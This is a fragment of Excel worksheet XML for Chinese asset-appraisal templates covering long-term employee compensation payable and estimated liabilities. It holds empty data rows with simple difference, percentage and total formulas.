      <c r="M23" s="555">
        <f>L23-K23</f>
        <v/>
      </c>
      <c r="N23" s="555">
        <f>IF(K23=0,"",M23/K23*100)</f>
        <v/>
      </c>
      <c r="O23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="580" t="n"/>
      <c r="H24" s="619" t="n"/>
      <c r="I24" s="560" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>SUM(I24:J24)</f>
        <v/>
      </c>
      <c r="L24" s="621" t="n"/>
      <c r="M24" s="555">
        <f>L24-K24</f>
        <v/>
      </c>
      <c r="N24" s="555">
        <f>IF(K24=0,"",M24/K24*100)</f>
        <v/>
      </c>
      <c r="O24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="580" t="n"/>
      <c r="H25" s="619" t="n"/>
      <c r="I25" s="560" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>SUM(I25:J25)</f>
        <v/>
      </c>
      <c r="L25" s="621" t="n"/>
      <c r="M25" s="555">
        <f>L25-K25</f>
        <v/>
      </c>
      <c r="N25" s="555">
        <f>IF(K25=0,"",M25/K25*100)</f>
        <v/>
      </c>
      <c r="O25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="580" t="n"/>
      <c r="H26" s="619" t="n"/>
      <c r="I26" s="560" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>SUM(I26:J26)</f>
        <v/>
      </c>
      <c r="L26" s="621" t="n"/>
      <c r="M26" s="555">
        <f>L26-K26</f>
        <v/>
      </c>
      <c r="N26" s="555">
        <f>IF(K26=0,"",M26/K26*100)</f>
        <v/>
      </c>
      <c r="O26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="580" t="n"/>
      <c r="H27" s="619" t="n"/>
      <c r="I27" s="560" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>SUM(I27:J27)</f>
        <v/>
      </c>
      <c r="L27" s="621" t="n"/>
      <c r="M27" s="555">
        <f>L27-K27</f>
        <v/>
      </c>
      <c r="N27" s="555">
        <f>IF(K27=0,"",M27/K27*100)</f>
        <v/>
      </c>
      <c r="O27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="578" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="580" t="n"/>
      <c r="H28" s="619" t="n"/>
      <c r="I28" s="560" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>SUM(I28:J28)</f>
        <v/>
      </c>
      <c r="L28" s="621" t="n"/>
      <c r="M28" s="555">
        <f>L28-K28</f>
        <v/>
      </c>
      <c r="N28" s="555">
        <f>IF(K28=0,"",M28/K28*100)</f>
        <v/>
      </c>
      <c r="O28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="578" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="580" t="n"/>
      <c r="H29" s="619" t="n"/>
      <c r="I29" s="560" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555">
        <f>SUM(I29:J29)</f>
        <v/>
      </c>
      <c r="L29" s="621" t="n"/>
      <c r="M29" s="555">
        <f>L29-K29</f>
        <v/>
      </c>
      <c r="N29" s="555">
        <f>IF(K29=0,"",M29/K29*100)</f>
        <v/>
      </c>
      <c r="O29" s="383" t="n"/>
    </row>
    <row r="30" ht="16.5" customHeight="1" s="415">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C30" s="567" t="n"/>
      <c r="D30" s="560" t="n"/>
      <c r="E30" s="560" t="n"/>
      <c r="F30" s="560" t="n"/>
      <c r="G30" s="560">
        <f>ROUND(SUM(G6:G29),2)</f>
        <v/>
      </c>
      <c r="H30" s="560" t="n"/>
      <c r="I30" s="560">
        <f>ROUND(SUM(I6:I29),2)</f>
        <v/>
      </c>
      <c r="J30" s="560">
        <f>ROUND(SUM(J6:J29),2)</f>
        <v/>
      </c>
      <c r="K30" s="560">
        <f>ROUND(SUM(K6:K29),2)</f>
        <v/>
      </c>
      <c r="L30" s="622">
        <f>ROUND(SUM(L6:L29),2)</f>
        <v/>
      </c>
      <c r="M30" s="555">
        <f>L30-K30</f>
        <v/>
      </c>
      <c r="N30" s="555">
        <f>IF(K30=0,"",M30/K30*100)</f>
        <v/>
      </c>
      <c r="O30" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="16">
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="B1:O1"/>
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="O5:O6"/>
    <mergeCell ref="I5:K5"/>
    <mergeCell ref="B2:O2"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:O30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67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 codeName="Sheet101">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="32.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="18.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="10.8333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="18.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>长期应付职工薪酬评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18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402" t="inlineStr">
        <is>
          <t>表6-5</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="549">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="376" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18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结算内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期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80" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="383" t="n"/>
    </row>
    <row r="7" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
    </row>
    <row r="8" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
    </row>
    <row r="9" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
    </row>
    <row r="10" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
    </row>
    <row r="11" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
    </row>
    <row r="12" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
    </row>
    <row r="13" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
    </row>
    <row r="14" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
    </row>
    <row r="15" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
    </row>
    <row r="16" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
    </row>
    <row r="17" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="555">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
    </row>
    <row r="18" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
    </row>
    <row r="19" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="555">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
    </row>
    <row r="20" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="555">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
    </row>
    <row r="21" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="555">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
    </row>
    <row r="22" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="555">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
    </row>
    <row r="23" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="555">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
    </row>
    <row r="24" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
    </row>
    <row r="25" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="555">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="383" t="n"/>
    </row>
    <row r="26" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="115" t="n"/>
      <c r="E26" s="555">
        <f>ROUND(SUM(E6:E25),2)</f>
        <v/>
      </c>
      <c r="F26" s="555">
        <f>ROUND(SUM(F6:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B2:I2"/>
    <mergeCell ref="B26:C26"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I26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5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 codeName="Sheet102">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="27.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="17.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="16.8333333333333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预计负债评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="342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402" t="inlineStr">
        <is>
          <t>表6-6</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="342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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="237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核算内容</t>
        </is>
      </c>
      <c r="F5" s="307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6.5" customFormat="1" customHeight="1" s="342">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="3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Format="1" customHeight="1" s="342">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380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Format="1" customHeight="1" s="342">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="560" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555">
        <f>G8-F8</f>
        <v/>
      </c>
      <c r="I8" s="555">
        <f>IF(F8=0,"",H8/F8*100)</f>
        <v/>
      </c>
      <c r="J8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="560" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555">
        <f>G9-F9</f>
        <v/>
      </c>
      <c r="I9" s="555">
        <f>IF(F9=0,"",H9/F9*100)</f>
        <v/>
      </c>
      <c r="J9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="560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Format="1" customHeight="1" s="342">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="560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Format="1" customHeight="1" s="342">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="560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Format="1" customHeight="1" s="342">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="560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Format="1" customHeight="1" s="342">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="560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Format="1" customHeight="1" s="342">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="560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Format="1" customHeight="1" s="342">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="560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Format="1" customHeight="1" s="342">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="560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Format="1" customHeight="1" s="342">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="560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Format="1" customHeight="1" s="342">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="560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Format="1" customHeight="1" s="342">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="560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Format="1" customHeight="1" s="342">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="560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Format="1" customHeight="1" s="342">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="560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Format="1" customHeight="1" s="342">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="560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Format="1" customHeight="1" s="342">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="560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Format="1" customHeight="1" s="342">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="560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Format="1" customHeight="1" s="342">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="560" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="560" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="342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380" t="n"/>
      <c r="F28" s="555">
        <f>SUM(F6:F27)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>SUM(G6:G27)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J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4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 codeName="Sheet103">
    <outlinePr summaryBelow="1" summaryRight="1"/>
